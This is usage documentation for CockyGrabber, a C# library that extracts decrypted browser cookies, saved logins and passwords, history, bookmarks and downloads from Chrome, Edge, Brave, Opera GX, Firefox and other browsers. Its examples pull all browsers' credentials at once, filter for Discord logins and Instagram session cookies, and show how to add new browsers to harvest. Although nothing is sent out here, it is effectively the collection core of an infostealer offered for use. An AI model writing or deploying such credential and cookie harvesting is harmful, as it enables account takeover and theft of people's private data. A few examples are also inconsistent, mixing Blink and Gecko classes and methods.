# Usage

## Importing CockyGrabber

*Note:* You will need to add `System.Data.SQLite` to your project. The package can be downloaded from the [official website](https://system.data.sqlite.org/) or from [NuGet](https://www.nuget.org/packages/System.Data.SQLite/). (In future versions of CockyGrabber, this won't be necessary)

```cs
using CockyGrabber;
using CockyGrabber.Grabbers;
```

## Grabbing information

### Grabbing information from Chromium/Blink-based Browsers

Example that shows how to grab Chrome cookies using the `ChromeGrabber`:

```cs
ChromeGrabber grabber = new ChromeGrabber(); // Create Grabber
var cookies = grabber.GetCookies(); // Collect all Cookies with GetCookies()

// Print the Hostname, Name, and Value of every cookie:
foreach (var cookie in cookies)
{
    string cookieHostname = cookie.HostKey;
    string cookieName = cookie.Name;
    string cookieValue = cookie.DecryptedValue;
    Console.WriteLine($"{cookieHostname}: {cookieName} = {cookieValue}");
}
```

*To collect browser information of any other Chromium/Blink-based browser just replace `ChromeGrabber` with `OperaGxGrabber`, `BraveGrabber`, or `EdgeGrabber`, and so on...*

### Grabbing Information from Gecko-based Browsers

Example that shows how to grab Chrome cookies using the `FirefoxGrabber`:

```cs
FirefoxGrabber grabber = new FirefoxGrabber(); // Create Grabber
var cookies = grabber.GetCookies(); // Collect all Cookies with GetCookies()

// Print Hostname, Name, and Value of every cookie:
foreach (var cookie in cookies)
{
    string cookieHostname = cookie.Host;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname}: {cookieName} = {cookieValue}");
}
```

CockyGrabber can also grab information like Logins, Downloads, Bookmarks and History:

```cs
(GRABBER) grabber = new (GRABBER); // Create Grabber

var bookmarks = grabber.GetBookmarks(); // Collect all Bookmarks with GetBookmarks()
var downloads = grabber.GetDownloads(); // Collect all Downloads with GetDownloads()
var logins = grabber.GetLogins(); // Collect all Logins with GetLogins()
var history = grabber.GetHistory(); // Collect all History with GetHistory()
```

## Grabbing data from multiple browsers

CockyGrabber provides a `UniversalGrabber` which can be used to grab Cookies, Logins, and such from multiple Browsers.</br>
Here is an example showing how to grab stuff from all Chromium/Blink-browsers:

```cs
UniversalGrabber grabber = new UniversalGrabber(); // Create Grabber

var cookies = grabber.GetAllBlinkCookies(); // Collect the Cookies from all Chromium/Blink based browsers
var logins = grabber.GetAllBlinkLogins(); // Collect the Logins from all Chromium/Blink based browsers
var bookmarks = grabber.GetAllBlinkBookmarks(); // Collect the Bookmarks from all Chromium/Blink based browsers
var history = grabber.GetAllBlinkHistory(); // Collect the History from all Chromium/Blink based browsers
var downloads = grabber.GetAllBlinkDownloads(); // Collect the Downloads from all Chromium/Blink based browsers
```

Gecko-based browsers are not very different from Chromium/Blink-based browsers, so you can use the same code to get data from them:

```cs
UniversalGrabber grabber = new UniversalGrabber(); // Create Grabber

var cookies = grabber.GetAllGeckoCookies(); // Collect the Cookies from all Gecko based browsers
var logins = grabber.GetAllGeckoLogins(); // Collect the Logins from all Gecko based browsers
var bookmarks = grabber.GetAllBlinkBookmarks(); // Collect the Bookmarks from all Gecko based browsers
var history = grabber.GetAllGeckoHistory(); // Collect the History from all Gecko based browsers
var downloads = grabber.GetAllBlinkDownloads(); // Collect the Downloads from all Gecko based browsers
```

## Getting specific data with headers

Say you want to grab the logins of a specific hostname/website; how would you do it?
You use the `GetLoginsBy()` Method!

Here is an example with the `EdgeGrabber`:

```cs
EdgeGrabber grabber = new EdgeGrabber(); // Create Grabber

// Collect all Discord Logins:
var discord_logins = grabber.GetLoginsBy(Blink.LoginHeader.origin_url, "https://discord.com/login");

// Collect the Logins that have the same password as you specified:
var logins_by_pswd = grabber.GetLoginsBy(Blink.LoginHeader.password_value, "password123");
```

Obviously you can also grab other specific data:

```cs
// Collect all Instagram Cookies:
var instagram_cookies = grabber.GetCookiesBy(Blink.CookieHeader.host_key, ".instagram.com");

// Collect all Google Bookmarks:
var google_bookmarks = grabber.GetBookmarksBy(Blink.CookieHeader.url, "https://google.com");

// ...
```

There are more headers you can use, but the ones I have listed are the most common ones.

> *(A documentation for the item headers such as `Blink.LoginHeader` and `Gecko.CookieHeader` will come sometime in the future)*

## Catching Exceptions

CockyGrabber also gives you the option to catch unexpected occurrences like errors:

```cs
try
{
    // Grab them Cookies and Logins:
    var c = grabber.GetCookies();
    var l = grabber.GetLogins();
}
catch (GrabberException e)
{
    // Check Error:
    switch (e.Error)
    {
        case GrabberError.CookiesNotFound: // Cookies weren't found
            Console.WriteLine("ERROR! The Cookie DB couldn't be found!");
            break;
        case GrabberError.LoginsNotFound: // Logins weren't found
            Console.WriteLine("ERROR! The Login DB couldn't be found!");
            break;
        case GrabberError.LocalStateNotFound: // Key wasn't found
            Console.WriteLine("ERROR! The 'Local State' file couldn't be found!");
            break;
    }
    Console.WriteLine("Original Exception: " + e);
}
```

## Adding Custom Browsers

If you want to add support for a new browser, you can do it by adding a new grabber class that inherits from `BlinkGrabber` or `GeckoGrabber`. After creating the class you will need to specify the browser's paths to the databases and files.

### CustomBlinkGrabber Example

```cs
public class CustomBlinkGrabber : BlinkGrabber
{
    public override string DataRootPath
    {
        get
        {
            // This is the path to the browser's root directory, which usually contains the browser profile folders and the 'Local State' file
            return $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\CustomBrowser\\User Data";
        }
    }
    public override string LocalStatePath
    {
        get
        {
            // This is the path to the 'Local State' file of the browser
            return $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\CustomBrowser\\User Data\\Local State";
        }
    }
    public override string CookiePath
    {
        get
        {
            // This is the path to the cookie database from a browser profile directory. (If the browser doesn't support multiple browsers, there are no profile directories, so the path starts from the root of the browser, not the profile folder.)
            return $"\\Network\\Cookies";
        }
    }
    public override string LoginDataPath
    {
        get
        {
            // This is the path to the login database from a browser profile directory. (If the browser doesn't support multiple browsers, there are no profile directories, so the path starts from the root of the browser, not the profile folder.)
            return $"\\Login Data";
        }
    }
    public override string HistoryPath
    {
        get
        {
            // This is the path to the history database from a browser profile directory. (If the browser doesn't support multiple browsers, there are no profile directories, so the path starts from the root of the browser, not the profile folder.)
            return $"\\History";
        }
    }
    public override string BookmarkPath
    {
        get
        {
            // This is the path to the bookmark database from a browser profile directory. (If the browser doesn't support multiple browsers, there are no profile directories, so the path starts from the root of the browser, not the profile folder.)
            return $"\\Bookmarks";
        }
    }
    public override string WebDataPath
    {
        get
        {
            // This is the path to the 'Web Data' database from a browser profile directory. (If the browser doesn't support multiple browsers, there are no profile directories, so the path starts from the root of the browser, not the profile folder.)
            return $"\\Web Data";
        }
    }
}
```

### CustomGeckoGrabber Example

```cs
public class CustomGeckoGrabber : BlinkGrabber
{
    public override string ProfileDirPath
    {
        get
        {
            // This is the path to the browser's 'Profiles' folder/directory, which contains the profile folders
            return $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\CustomBrowser\\Profiles";
        }
    }
}
```
